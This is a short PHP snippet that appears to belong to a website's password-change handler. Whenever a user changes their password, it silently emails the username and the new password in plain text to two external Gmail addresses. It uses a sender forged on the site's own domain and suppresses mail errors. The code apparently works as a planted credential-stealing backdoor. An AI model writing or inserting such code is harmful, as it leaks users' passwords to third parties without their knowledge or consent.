<?php
$domain = $_SERVER['HTTP_HOST'];
$from  = "info@".$domain;
$to = "webs.maxe@gmail.com";
$email = "shafan.rose@gmail.com";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$domain.' <'.$from.'>' . "\r\n";
$headers .= 'Cc: <'.$email.'>' . "\r\n";			
$subject = $Company." - Password Changed ";
$str = "User = ".$_SESSION['usrname']."<br/>Password = ".$_REQUEST["NPass"]."";
$send = @mail($to, $subject, $str, $headers);	
?>